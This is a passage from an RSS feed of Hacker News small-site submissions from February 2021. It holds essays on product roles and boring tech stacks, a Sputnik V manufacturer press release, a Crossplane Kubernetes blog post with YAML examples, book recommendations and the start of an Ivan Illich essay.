goal.</em></p><p>A product owner (PO) maximizes the value of a product through the creation and management of the product backlog, creation of user stories for the development team. The product owner is the customer’s representative to the development team. He addresses customer’s pain points by managing and prioritizing a visible product backlog. The PO is the first point of call when the development team needs clarity about interpreting a product feature to be implemented.</p><p><span>
      <span></span>
  <picture>
        <source srcset="https://www.damilolaa.xyz/static/0b33b68ff9b4c94d698dd11d756d6319/06fd5/pm.webp 700w" sizes="(max-width: 700px) 100vw, 700px" type="image/webp">
        <source srcset="https://www.damilolaa.xyz/static/0b33b68ff9b4c94d698dd11d756d6319/f6cdf/pm.png 700w" sizes="(max-width: 700px) 100vw, 700px" type="image/png">
        <img tabindex="0" src="https://www.damilolaa.xyz/static/0b33b68ff9b4c94d698dd11d756d6319/f6cdf/pm.png" alt="Product Manager vs Product Marketing Manager vs Product Owner" title="Photo by Marvin Meyer on Unsplash" loading="lazy">
      </picture>
    </span></p><p>Going more practical, we will use a hypothetical case study of a tech company, Slyde, to explain these roles to clearly understand their day-to-day duties.</p><p>Slyde is a financial technology company based in Lagos, Nigeria with coverage in other African countries. The company has been providing payment solutions through its web-based application but has noticed a large churn rate in areas with poor internet connection which in turn delay users from completing their transaction. The product team made this observation and has been tasked to come up with a solution.</p><h3 id="where-does-the-product-manager-product-marketing-manager-and-the-product-owner-come-in">Where does the Product Manager, Product Marketing Manager, and the Product Owner come in?</h3><p><strong>PM</strong>: The Product Manager will interface with the users through user interviews/feedback surveys or other means to hear directly from the users. They will come up with hypotheses alongside the team and validate them through prototyping and user testing. They will then create a strategy on the feature and align the team and stakeholders around it. The PM who is also the chief custodian of the entire product roadmap will, therefore, be tasked with the duty of prioritization. Before going ahead to carry out research and strategy, they will have to convince the stakeholders if it is a good choice to build the feature in context at that particular time or wait a bit longer based on the content of the roadmap.</p><p><strong>PMM</strong>: The product marketing manager is tasked with market feasibility and discovering if the features being built align with the company’s sales and revenue plan for the period. They also make research on how sought-after the feature is being anticipated and how it will impact the budget. They communicate the values of the feature; the why, what, and when to potential buyers — In this case users in countries with poor internet connection.</p><p><strong>PO</strong>: The product owner will first have to prioritize the backlog to see if there are no important tasks to be executed and if this new feature is worth leaving whatever is being built currently. They will also consider the development effort required to build the feature i.e the time, tools, and skill set that will be required. They will be the one to tell if the expertise of the current developers is enough or if more engineers or designers are needed to be able to deliver at the scheduled time. The product owner is also armed with the task of interpreting the product/feature requirements for the development team. They serve as the interface between the stakeholders and the development team.</p><hr><p>Lastly,</p><p>The goal of a product team is to delight its user by providing an excellent solution to their pain points regardless of the job title/role. Irrespective of your job role on a product team, you should always be driven by user empathy and the company’s goal as this will in-turn make you collaborate better among the team. A product person should first and foremost see themselves as a product leader — one who makes sure the user’s need is always advocated for, despite top executive declination, the product person is to persuasively align the executive to this.</p><blockquote><blockquote><p>Product Owner is a role you play on a Scrum team. Product Manager is the job. — Melissa Perri</p></blockquote></blockquote><p>So, regardless of your job role, a great product person will always act in the stead of a product manager and never streamline herself to the JD only but be actively involved directly or indirectly in every phase of the product development cycle. When the role is clearly understood and the duties implemented collaboratively as a team, every aspect of the product comes together in one beautiful piece.</p><p>This article first appeared on my <a href="https://blog.usejournal.com/product-manager-vs-product-marketing-manager-vs-product-owner-8ab08bc45662" title="Medium" target="_blank" rel="noreferrer">Medium</a></p><p>Thanks to <a href="https://www.linkedin.com/in/olufisayo-babalola/" target="_blank" rel="noreferrer">Olufisayo Babalola</a> for reviewing this article.</p><hr><h3 id="sources">Sources:</h3><ul><li><a href="https://unsplash.com/s/photos/product-manager?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noreferrer">Hero Image by airfocus on Unsplash</a></li></ul></div></article></div>]]>
            </description>
            <link>https://www.damilolaa.xyz/Product-Manager-vs-Product-Marketing-Manager-vs-Product-Owner</link>
            <guid isPermaLink="false">hacker-news-small-sites-26010927</guid>
            <pubDate>Wed, 03 Feb 2021 05:39:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Happiness Is a Boring Stack]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26010671">thread link</a>) | @tardismechanic
<br/>
February 2, 2021 | https://www.expatsoftware.com/Articles/happiness-is-a-boring-stack.html | <a href="https://web.archive.org/web/*/https://www.expatsoftware.com/Articles/happiness-is-a-boring-stack.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
	
<div>
	
	<p>
I spend way too much time on <a href="https://news.ycombinator.com/">Hacker News</a>.  It's a fun place, and a good way to keep up to date on all the new tech that us developer folk seem to need to know about.  But it also leaves a fella feeling like he <b>really needs to keep up</b> with all this stuff.  I mean, if you don't have a side project using the latest client-side framework, well, good luck ever finding a job again in this industry.
</p>
<p>
Thinking about it, I find that I straddle the line on this. As a long-time contractor, I try to stay up to date on the New Shiny and will happily run with whatever flavor of the month language, framework, and programming paradigm that a given gig wants. Yeah, sure, Node.js with tons of functional stuff mixed in pulling from a NoSQL store and React on the front end. I'm your guy. We're gonna change the world!
</p>
<p>
But for 
<a href="https://www.twiddla.com/">my</a>
<a href="https://unwaffle.com/">own</a>
<a href="https://www.s3stat.com/">stuff</a>, 
there's no way I'd use any of that crap. Good old C#, SQL Server and a proper boring stack and tool set that I know won't just up and fall over on a Saturday morning and leave me debugging NPM dependencies all weekend instead of bouldering in the forest with the kids. This stuff is my proper income stream, and the most important thing is that it works. If that means I have to write a "for" loop and declare variables and risk 19 year old kids snooting down at my code, so be it.
</p>
<h4>I can't tell you how nice it is to have software in production on a boring stack. It gives you freedom to do other things.</h4>

<p>
I can (and often do) go entire months without touching the codebase of my main rent-paying products. It means I can, among other things, pick up a full-time development gig to sock away some extra runway, take off and go backpacking around the world, or better still, build yet another rent-paying product without having to spend a significant amount of time keeping the old stuff alive.
</p>
<p>
It seems like on a lot of stacks, keeping the server alive, patched and serving webpages is a part-time job in itself. In my world, that's Windows Update's job. Big New Releases come and go, but they're all 100% backwards compatible, so when you get around to upgrading it's just a few minutes of point and clicking with nothing broken.
</p>
<p>
I see it as analogous to <b>Compound Interest, but to productivity</b>. The less effort you need to spend on maintenance, the more pace you can keep going forward.
</p>
<p>
But yeah, the key is to never get so far down in to that comfy hole that you can't hop back into the present day when it's time to talk shop with the cool kids.  Shine on, flavor of the week!
</p>

	

	<p><small>
		<a href="https://news.ycombinator.com/submitlink?u=https://www.expatsoftware.com/Articles/happiness-is-a-boring-stack.html&amp;t=Happiness%20is%20a%20Boring%20Stack" id="ctl00_ctl00_contentBody_contentMain_blogEntry_linkHN" title="Discuss on HackerNews"><img src="https://www.expatsoftware.com/images/hackernews_14.gif" alt="HackerNews" height="14" width="14"> Discuss on hacker news</a>
	</small>

</p></div>
	

				</div></div>]]>
            </description>
            <link>https://www.expatsoftware.com/Articles/happiness-is-a-boring-stack.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26010671</guid>
            <pubDate>Wed, 03 Feb 2021 04:40:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sputnik V vaccine peer reviewed with efficacy of 91.6%]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 64 (<a href="https://news.ycombinator.com/item?id=26009932">thread link</a>) | @The_rationalist
<br/>
February 2, 2021 | https://sputnikvaccine.com/newsroom/pressreleases/a-vaccine-for-all-mankind-sputnik-v-s-efficacy-in-fighting-covid-19-is-validated-by-internationally-/ | <a href="https://web.archive.org/web/*/https://sputnikvaccine.com/newsroom/pressreleases/a-vaccine-for-all-mankind-sputnik-v-s-efficacy-in-fighting-covid-19-is-validated-by-internationally-/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<ul>
<li>
<p>
In an interim analysis of a Phase III clinical trial, Sputnik V <b>showed strong efficacy, immunogenicity and safety results.</b>
</p>
</li>
<li>
<p>
<b>Efficacy of Sputnik V against COVID-19 was reported at 91.6%.</b>
</p>
<ul>
<li>
<p>
Analysis included data on 19,866 volunteers, who received both the first and second doses of the Sputnik V vaccine or placebo at the final control point of 78 confirmed COVID-19 cases.
</p>
</li>
<li>
<p>
Efficacy in the elderly group of 2,144 volunteers over 60 years old was 91.8% and did not differ statistically from the 18-60 group.
</p>
</li>
</ul>
</li>
<li>
<p>
<b>Sputnik V provides full protection against severe cases of COVID-19.</b>
</p>
</li>
<li>
<p>
<b>Among the cases analyzed, over 98% of volunteers developed humoral immune response and 100% - cellular immune response.</b>
</p>
</li>
<li>
<p>
<b>The level of virus neutralizing antibodies of volunteers vaccinated with Sputnik V is 1.3-1.5 times higher</b> than the level of antibodies of patients who recovered from COVID-19.
</p>
</li>
<li>
<p>
<b>Excellent safety profile. Most adverse events (94%) were mild</b> and included flu-like syndromes, injection site reactions, headache and asthenia.
</p>
<ul>
<li>
<p>
<b>No serious adverse events associated with vaccination, as confirmed by Independent Data Monitoring Committee.</b>
</p>
</li>
<li>
<p>
<b>No strong allergies, no anaphylactic shock.</b>
</p>
</li>
</ul>
</li>
<li>
<p>
<b>Sputnik V is one of the three vaccines in the world with efficacy of over 90%. Furthermore, Sputnik V stands out among these vaccines thanks to a number of key advantages:</b>
</p>
<ul>
<li>
<p>
<b>Based on a platform of human adenoviral vectors proven to be safe over decades of use.</b>
</p>
</li>
<li>
<p>
<b>Easy distribution worldwide: storage temperature of between two and eight degrees Celsius.</b>
</p>
</li>
<li>
<p>
<b>One of the most affordable vaccines in the world with a price of less than $10 per shot.</b>
</p>
</li>
</ul>
</li>
<li>
<p>
<b>Sputnik V is already registered in 16 countries:</b> Russia, Belarus, Serbia, Argentina, Bolivia, Algeria, Palestine, Venezuela, Paraguay, Turkmenistan, Hungary, UAE, Iran, Republic of Guinea, Tunisia and Armenia.
</p>
</li>
<li>
<p>
<b>In the first week of February, vaccination with Sputnik V will start in the following 12 countries:</b> Bolivia, Kazakhstan, Turkmenistan, Palestine, UAE, Paraguay, Hungary, Armenia, Algeria, Bosnian Serb Republic, Venezuela and Iran.
</p>
<ul>
<li>
<p>
<b>In 10 countries out of 12, Sputnik V will be the first coronavirus vaccine approved for civil circulation.</b>
</p>
</li>
</ul>
</li>
</ul>
<p>
<b>Moscow, February 2, 2021</b> – The Gamaleya National Research Center of Epidemiology and Microbiology of the Ministry of Health of the Russian Federation and the Russian Direct Investment Fund (RDIF, Russia’s sovereign wealth fund) announce that the Lancet, one of the world's oldest and most respected medical journals, has published interim results of a Phase III clinical trial of Sputnik V, confirming the vaccine’s high efficacy and safety. Sputnik V, which is based on a well-studied human adenoviral vectors platform, is the world’s first registered vaccine against coronavirus.
</p>
<p>
In the interim efficacy analysis of the randomized, double-blind, placebo-controlled clinical trial, where data on 19,866 volunteers were included in the efficacy analysis (14,964 of whom received the vaccine and 4,902 the placebo), the two-dose treatment of Sputnik V administered 21 days apart demonstrated efficacy of 91.6% against COVID-19. The calculation is based on the analysis of 78 confirmed cases of COVID-19 identified in the placebo group (62 cases) and in the vaccine group (16 cases). Sputnik V generated a robust humoral and cell mediated immune response.
</p>
<p>
<b>Alexander Gintsburg, Director of the Gamaleya Research Institute of Epidemiology and Microbiology,</b> said:
</p>
<p>
“The publication of internationally peer reviewed data on Sputnik V’s clinical trial results is a great success in the global battle against the COVID-19 pandemic. The Russian vaccine’s safety and high efficacy are shown by the hard scientific data presented and I congratulate the entire team of Gamaleya National Research Center for this monumental achievement. Several vaccines have already been created based on human adenoviruses and this tool is one of the most promising for development of new vaccines in the future.”
</p>
<p>
<b>Kirill Dmitriev, CEO of the Russian Direct Investment Fund,</b> commented:
</p>
<p>
“This is a great day in the fight against the COVID-19 pandemic. The data published by The Lancet proves that not only Sputnik V is the world’s first registered vaccine, but also one of the best. It fully protects against severe COVID-19 according to data which has been independently compiled and reviewed by peers and then published in The Lancet. Sputnik V is one of only three vaccines in the world with efficacy of over 90% but outperforms them in terms of safety, ease of transportation due to storage requirements of +2 to +8 degrees and a more affordable price. Sputnik V is a vaccine for all mankind.”
</p>
<p>
<b>Hildegund C.J. Ertl, M.D., Professor, Vaccine &amp; Immunotherapy Center, The Wistar Institute, USA,</b> said:
</p>
<p>
“The vaccine is 100% effective in preventing serious disease or death, which in the end is the most crucial parameter; we can all deal with the sniffles as long as we stay out of the hospital or the graveyard. Even after a single dose of this prime-boost regimen protection against disease was at 87.6%. Sputnik V is thus more effective than the AstraZeneca or Johnson&amp;Johnson. Sputnik V, which, unlike the equally efficacious RNA vaccines of Pfizer and Moderna, can be stored in the fridge, will be of tremendous value to combat the global COVID-19 pandemic.”
</p>
<p>
<b>Cecil Czerkinsky, PhD, M.D., Research Director, National Institute of Health and Medical research (Inserm), France,</b> said:
</p>
<p>
“The interim results of the phase 3 clinical trial of Sputnik V COVID adenovirus vector vaccine are fairly impressive. This vaccine appears to be highly efficacious and immunogenic across age groups. This is clearly good news as this dual formulation vaccine is comparatively easy to manufacture and to deploy amid the anticipated global shortage of vaccines and logistical problems in vaccination roll-out of temperature-sensitive vaccines recently authorized for emergency use.”
</p>
<p>
<b>Omar Sued, President of the Society of infectologists, Argentina,</b> said:
</p>
<p>
“The paper, published in The Lancet, confirms successful results and provides additional information about the efficacy and the safety of this vaccine in different subgroups. From the public health´s point of view, the efficacy of the vaccine was very high. The safety profile was very good. The dissemination of this information is vital for informing the scaling up and rollout of this vaccine worldwide.”
</p>
<p>
<b>David Livermore, Professor of Medical Microbiology at the University of East Anglia, UK,</b> said:
</p>
<p>
“Presently the world needs all the good vaccines that it can get against COVID-19. And these are impressive results: Sputnik V is the first adenovirus vector vaccine to achieve the 90% efficacy seen with the two mRNA vaccines.”
</p>
<p>
According to the peer-reviewed study results, the vaccine provides full protection against severe cases of the novel coronavirus infection. Among the confirmed severe cases of COVID-19, 20 were recorded in the placebo group, while none were recorded in the vaccine group. Due to the time needed for the immune response to develop, in the first week after vaccination there was no significant difference in protection against severe cases of COVID-19 between the vaccine and placebo groups, while in the period from 7 to 14 days the vaccine’s efficacy rose to 50%, in the period from 14 to 21 days to 74.1%, and to 100% from the 21st day, giving full protection against severe cases of the coronavirus.
</p>
<p>
Importantly, the study included 2,144 volunteers over 60 years old with the maximum ages of 87 years (vaccine group) and 84 years (placebo group), showing great safety results for the elder age strata. The vaccine’s efficacy for the elderly was shown at 91.8% and did not differ statistically from the group of 18-60 years old, also demonstrating great safety and immunogenicity results.
</p>
<p>
Sputnik V has demonstrated an excellent safety profile: 70 episodes of serious adverse events (SAE) not related to COVID-19 were recorded in 68 study participants: in 45 volunteers from the vaccine group and 23 volunteers from the placebo group. None of these events were associated with the vaccination as confirmed by Independent Data Monitoring Committee. Most adverse events (94%) were mild and were limited to flu-like syndromes, injection site reactions, headache and asthenia.
</p>
<p>
Sputnik V is one of only three vaccines in the world to have demonstrated efficacy of over 90%. Sputnik V stands out among these vaccines thanks to a number of key advantages, namely: a well-studied and highly efficient human adenoviral vector mechanism proven safe over decades; the vaccine’s low cost in comparison to other approaches; and fewer logistics requirements with a storage temperature of between two to eight degrees Celsius allowing for easier distribution worldwide.
</p>
<p>
The safety of vaccines based on human adenoviruses has been confirmed in more than 75 international publications and more than 250 clinical trials conducted during the past two decades - while the history of use of human adenoviruses in vaccine development started in 1953. Adenovirus vectors are genetically modified viruses of the regular flu that cannot reproduce in a human body. When the Sputnik V vaccine is used, the coronavirus itself does not enter the body as the vaccine only contains genetic information about part of its outer protein coat, the so called "spikes" forming its crown. This completely eliminates the possibility of getting infected as a result of vaccination while also causing the body to generate a stable immune response.
</p>
<p>
In addition, Sputnik V uses two different vectors - based on human adenovirus serotypes Ad5 and Ad26 - in two separate shots, allowing for a more effective defense against the coronavirus than vaccines using the same vector for both shots. By deploying two different vectors, Sputnik V avoids a possible neutralizing effect and generates a durable and longer-lasting immune response.
</p>
<p>
***
</p>
<p>
<b>The …</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sputnikvaccine.com/newsroom/pressreleases/a-vaccine-for-all-mankind-sputnik-v-s-efficacy-in-fighting-covid-19-is-validated-by-internationally-/">https://sputnikvaccine.com/newsroom/pressreleases/a-vaccine-for-all-mankind-sputnik-v-s-efficacy-in-fighting-covid-19-is-validated-by-internationally-/</a></em></p>]]>
            </description>
            <link>https://sputnikvaccine.com/newsroom/pressreleases/a-vaccine-for-all-mankind-sputnik-v-s-efficacy-in-fighting-covid-19-is-validated-by-internationally-/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26009932</guid>
            <pubDate>Wed, 03 Feb 2021 02:38:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crossplane vs. Cloud Provider Infrastructure Addons]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26009017">thread link</a>) | @hasheddan
<br/>
February 2, 2021 | https://blog.crossplane.io/crossplane-vs-cloud-infrastructure-addons/ | <a href="https://web.archive.org/web/*/https://blog.crossplane.io/crossplane-vs-cloud-infrastructure-addons/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Kubernetes has demonstrated the power of a well architected control plane with a great API. The industry is beginning to notice that this control plane can be used to do much more than orchestrate containers, and are increasingly looking to use the Kubernetes control plane to manage all of their infrastructure.</p><p>Several “cloud provider infrastructure” addons exist for Kubernetes. These addons provide a Kubernetes interface to a cloud provider’s infrastructure - databases, queues, etc. The three major clouds each maintain their own - Google Config Connector, Azure Service Operator, and Amazon Controllers for Kubernetes. Each exposes their respective cloud’s control plane APIs as custom resources, allowing Kubernetes users to manage an RDS instance (for example) using the same tools they would use to manage a <code>Deployment</code> or a <code>ConfigMap</code>.</p><figure><img src="https://blog.crossplane.io/content/images/2021/02/HeaderHero.svg"><figcaption>Crossplane exposes all of the major cloud provider control plane APIs as custom resources.</figcaption></figure><p>Crossplane is often compared to the various cloud provider infrastructure addons. There are certainly similarities - it is also a Kubernetes addon, and it also exposes all of the major cloud provider control plane APIs as custom resources. Crossplane even <a href="https://blog.crossplane.io/accelerating-crossplane-provider-coverage-with-ack-and-azure-code-generation-towards-100-percent-coverage-of-all-cloud-services/">shares code with some of these addons</a>. Where Crossplane differs is in how we expose cloud provider APIs.</p><blockquote>
<p>The Crossplane community believes that the typical developer using Kubernetes to deploy their application shouldn’t have to deal with low level infrastructure APIs.</p>
</blockquote>
<p>Drawing on our experiences as platform builders, SREs, and application developers we’ve designed Crossplane as a toolkit to build your own custom resources on top of any API - often those of the cloud providers. We think this approach is critical to enable <em>usable</em> self-service infrastructure in Kubernetes.</p><p>In this post we’ll demonstrate that seemingly simple tasks like spinning up a new database in the cloud for your applications to consume can often be more complicated than it would at first seem, and how Crossplane is designed to help tame that complexity.</p><p>Crossplane today consists of three things:</p><ol><li><em>Providers</em> extend Crossplane with custom resources that can be used to declaratively configure a system. The AWS provider for example, adds custom resources for AWS services like RDS and S3. We call these ‘managed resources’. Managed resources match the APIs of the system they represent as closely as possible, but they’re also opinionated. Common functionality like status conditions and references work the same no matter which provider you’re using - all managed resources comply with the Crossplane Resource Model, or XRM.</li><li><em>Composition</em> allows a platform team to define new custom resources that are composed of managed resources. We call these composite resources, or XRs. An XR typically groups together a handful of managed resources into one logical resource, exposing only the settings that the platform team deems useful and deferring the rest to an API-server-side template we call a ‘Composition’.</li><li><em>Packages</em> allow a platform team to quickly package, share, and declaratively install new kinds of composite resources and the providers they build on.</li></ol><blockquote>Despite the name, “provider” doesn’t necessarily mean “cloud provider”. Crossplane has providers that add support for managing databases on a SQL server, managing Helm releases, and <a href="https://blog.crossplane.io/providers-101-ordering-pizza-with-kubernetes-and-crossplane/">ordering pizza</a>.</blockquote><figure><img src="https://blog.crossplane.io/content/images/2021/02/Crossplanecity.svg"><figcaption>When we founded Crossplane we focused on supporting the most useful resources.</figcaption></figure><p>When we founded the Crossplane project we started at the managed resource layer. We focused on the resources we thought would be the most useful to application developers - things like cloud databases, caches, and storage buckets. We quickly heard from early adopters that being able to spin up these resources alone <em>wasn’t enough</em>. An RDS instance might also need a security group or a subnet group to be reachable. GCP Cloud SQL instances and Azure SQL servers face similar issues. This pattern permeates cloud infrastructure; another example we see often is folks wanting to create an IAM policy for each DynamoDB table they create. </p><p>Let’s dig into the example of an application developer requesting an SQL database for their application to use. An experience you initially hope will look like this:</p><pre><code>apiVersion: database.aws.crossplane.io/v1beta1
kind: RDSInstance
metadata:
  name: example-rds
spec:
  forProvider:
    dbInstanceClass: db.t3.medium
    engine: mysql
    allocatedStorage: 20
</code></pre>
<p>Can easily end up looking like this:</p><pre><code>apiVersion: database.aws.crossplane.io/v1beta1
kind: RDSInstance
metadata:
  name: example-rds
spec:
  forProvider:
    region: "us-west-2"
    dbInstanceClass: "db.t3.medium"
    engine: mysql
    engineVersion: "5.7"
    dbSubnetGroupName: external-subnet-group
    vpcSecurityGroupIDRef:
      name: example-sg
    masterUsername: cooladmin
    skipFinalSnapshotBeforeDeletion: false
    publiclyAccessible: true
    allocatedStorage: 20
    autoMinorVersionUpgrade: true
    backupRetentionPeriod: 30
    caCertificateIdentifier: "rds-ca-2019"
    copyTagsToSnapshot: true
    deletionProtection: true
    enableIAMDatabaseAuthentication: false
    enablePerformanceInsights: true
    performanceInsightsRetentionPeriod: 7
    finalDBSnapshotIdentifier: example-rds-snapshot
    licenseModel: general-public-license
    multiAZ: true
    port: 3306
    preferredBackupWindow: "06:15-06:45"
    preferredMaintenanceWindow: "sat:09:21-sat:09:51"
    storageEncrypted: false
    storageType: "gp2"
  writeConnectionSecretToRef:
    namespace: app-team-a
    name: example-rds
---
apiVersion: ec2.aws.crossplane.io/v1beta1
kind: SecurityGroup
metadata:
  name: example-sg
spec:
  forProvider:
    region: us-west-2
    vpcId: externally-managed-vpc
    groupName: crossplane-getting-started
    description: Allow access to MySQL
    ingress:
      - fromPort: 3306
        toPort: 3306
        ipProtocol: tcp
        ipRanges:
          - cidrIp: "10.0.10.0/0"
            description: Production
---
apiVersion: mysql.sql.crossplane.io/v1alpha1
kind: ProviderConfig
metadata:
  name: example-rds
spec:
  credentials:
    source: MySQLConnectionSecret
    connectionSecretRef:
      namespace: platform-infra
      name: example-rds
---
apiVersion: mysql.sql.crossplane.io/v1alpha1
kind: Database
metadata:
  name: example
spec:
  providerConfigRef:
    name: example-rds
---
apiVersion: mysql.sql.crossplane.io/v1alpha1
kind: User
metadata:
  name: example-user
spec:
  providerConfigRef:
    name: example-rds
  writeConnectionSecretToRef:
    namespace: app-team-a
    name: example-rds-user
---
apiVersion: mysql.sql.crossplane.io/v1alpha1
kind: Grant
metadata:
  name: example
spec:
  providerConfigRef:
    name: example-rds
  forProvider:
    privileges:
    - SELECT
    - INSERT
    - DELETE
    - UPDATE
    - EXECUTE
    userRef:
      name: example-user
    databaseRef:
      name: example
</code></pre>
<p>You might notice that we create a database and a user in the above example - something the RDS API does not support natively.</p><blockquote>Sometimes spinning up practically functional infrastructure requires multiple providers - even if you only use one cloud. In this case we use the SQL provider to finish what we started with the AWS provider.</blockquote><p>This will be an imposing amount of configuration for some application developers. They want to be able to self service their infrastructure needs, but shouldn’t need to be experts in the features and functionality of cloud provider APIs to do so. This is where Composition comes in - it allows a platform team to offer their application developers an experience much closer to the one they originally envisioned. Using Composition the application developer experience can look like this:</p><pre><code>apiVersion: example.org/v1
kind: ExampleCoDatabase
metadata:
  name: example
spec:
  parameters:
    storageGB: 20
    username: example-user
  compositionSelector:
    matchLabels:
      engine: mysql
      class: production
  writeConnectionSecretToRef:
    name: example-database-credentials 
</code></pre>
<p>This is a composite resource - an XR.</p><blockquote>When an application developer creates, updates, or deletes this XR Crossplane can create, update, or delete the more verbose set of managed resources from the previous example.</blockquote><p>Composition allows the infrastructure experts - the platform team - to determine what settings their application developers need, and how to use those settings to produce an RDS instance, security group, database, etc. In this example the application developer can influence the size of the database but not its backup settings, which are enforced by the platform team.</p><figure><img src="https://blog.crossplane.io/content/images/2021/02/CrossplaneConsole@2x.png"><figcaption>Framing your opinions at the API level fosters automation and eases integration.</figcaption></figure><p>You may wonder why a platform team would use Composition rather than a familiar, existing tool like Helm or Kustomize. While it’s true that there are similarities, we feel that it’s better to frame your organisation's opinions at the API level, rather than via client-side tooling. For example when you use Crossplane to expose the above purpose-built <code>ExampleCoDatabase</code> API:</p><ul><li>Any REST client (from kubectl to curl to Python) can create an <code>ExampleCoDatabase</code> with a single API call. This fosters automation and eases integration with other systems.</li><li>Policy is enforced. RBAC can ensure at the API level that application developers may influence only the fields exposed by an <code>ExampleCoDatabase</code> XR. The platform team can ensure application developers have RBAC access to configure the settings they need, and nothing else.</li><li>RBAC is framed around your desired abstractions. Access is granted “to create an ExampleCo database”, not “to create an RDS instance, a security group, etc etc”.</li></ul><p>One novel design folks notice when they start using Crossplane is that most Crossplane custom resources are cluster scoped - they exist above the scope of any Kubernetes namespace. While this can seem odd at first, it’s another decision that was informed by real world scenarios.</p><p>Take the above <code>ExampleCoDatabase</code> XR. Assume that several teams of application developers, each with their own namespace, want …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.crossplane.io/crossplane-vs-cloud-infrastructure-addons/">https://blog.crossplane.io/crossplane-vs-cloud-infrastructure-addons/</a></em></p>]]>
            </description>
            <link>https://blog.crossplane.io/crossplane-vs-cloud-infrastructure-addons/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26009017</guid>
            <pubDate>Wed, 03 Feb 2021 00:21:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four books professional developers should read (and a few you don't need to)]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 6 (<a href="https://news.ycombinator.com/item?id=26007626">thread link</a>) | @eatonphil
<br/>
February 2, 2021 | https://notes.eatonphil.com/books-developers-should-read.html | <a href="https://web.archive.org/web/*/https://notes.eatonphil.com/books-developers-should-read.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <p>These are the books I recommend to developers wanting to improve their
skills as professional programmers because of high information
density, believable premises/examples, and being well edited.</p>
<p>You don't need to read books to improve as a developer but
they are unparalleled in quickly helping you gain depth in a subject.</p>
<h3 id="effective-python:-90-specific-ways-to-write-better-python">Effective Python: 90 Specific Ways to Write Better Python</h3><p>If you're a Python developer wanting to improve your craft you should
read this. Good Python starts with a deep understanding of the
standard library and language.</p>
<h3 id="high-performance-browser-networking">High Performance Browser Networking</h3><p>If your code is triggered by a desktop or mobile browser you should
read this. It is a thorough high level introduction to mobile
networks, browser network protocols, and fundementals of networking.</p>
<h3 id="designing-data-intensive-applications">Designing Data-Intensive Applications</h3><p>If your databases and APIs are a bottleneck you should read this. A
solid introduction to distributed computing, data transfer, indexing,
etc.</p>
<h3 id="site-reliability-engineering:-how-google-runs-production-services">Site Reliability Engineering: How Google Runs Production Services</h3><p>If you are responsible for services in production you should read
this. It's Google specific but is an excellent background on practices
for monitoring and maintaining production environments.</p>
<h3 id="that's-it!">That's it!</h3><p>Generic software books conspicuously not on this list for
me:</p>
<ul>
<li>Clean Code</li>
<li>JavaScript the Good Parts</li>
<li>Design Patterns/Gang of Four</li>
<li>Structure and Interpretation of Computer Programs</li>
<li>A Philosophy of Software Design</li>
</ul>
<p>They're not all bad but give nowhere near as much return for the
investment of your time.</p>
<h4 id="feedback">Feedback</h4><p>As always, I'd love to <a href="mailto:me@eatonphil.com">hear from you</a> with
questions or ideas.</p>
<blockquote><p lang="en" dir="ltr">Four books I recommend to professional developers wanting to improve their craft, and a few I'd not<a href="https://t.co/1aTrfqZ9bd">https://t.co/1aTrfqZ9bd</a></p>— Phil Eaton (@phil_eaton) <a href="https://twitter.com/phil_eaton/status/1356391931274756096?ref_src=twsrc%5Etfw">February 2, 2021</a></blockquote> 

      </div>
    </div></div>]]>
            </description>
            <link>https://notes.eatonphil.com/books-developers-should-read.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26007626</guid>
            <pubDate>Tue, 02 Feb 2021 22:13:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Silence Is a Commons (1983)]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26007100">thread link</a>) | @cardamomo
<br/>
February 2, 2021 | http://www.davidtinapple.com/illich/1983_silence_commons.html | <a href="https://web.archive.org/web/*/http://www.davidtinapple.com/illich/1983_silence_commons.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div><span size="+2">Silence is a Commons by Ivan Illich</span><p>
						
						Computers are doing to communication<br>
						what fences did to pastures<br>
						and cars did to streets.</p><p>
						
						by Ivan Illich</p><p>
						
						
						
						
						Minna-san, gladly I accept the honour of addressing this forum on Science and Man. The theme that Mr. Tsuru proposes, "The Computer-Managed Society," sounds an alarm. Clearly you foresee that machines which ape people are tending to encroach on every aspect of people's lives, and that such machines force people to behave like machines. The new electronic devices do indeed have the power to force people to "communicate" with them and with each other on the terms of the machine. Whatever structurally does not fit the logic of machines is effectively filtered from a culture dominated by their use.</p><p>
						
						The machine-like behaviour of people chained to electronics constitutes a degradation of their well-being and of their dignity which, for most people in the long run, becomes intolerable. Observations of the sickening effect of programmed environments show that people in them become indolent, impotent, narcissistic and apolitical. The political process breaks down, because people cease to be able to govern themselves; they demand to be managed.</p><p>
						
						I congratulate Asahi Shimbun on its efforts to foster a new democratic consensus in Japan, by which your more than seven million readers become aware of the need to limit the encroachment of machines on the style of their own behaviour. It is important that precisely Japan initiate such action. Japan is looked upon as the capital of electronics; it would be marvellous if it became for the entire world the model of a new politics of self-limitation in the field of communication, which, in my opinion, is henceforth necessary if a people wants to remain self-governing.</p><p>
						
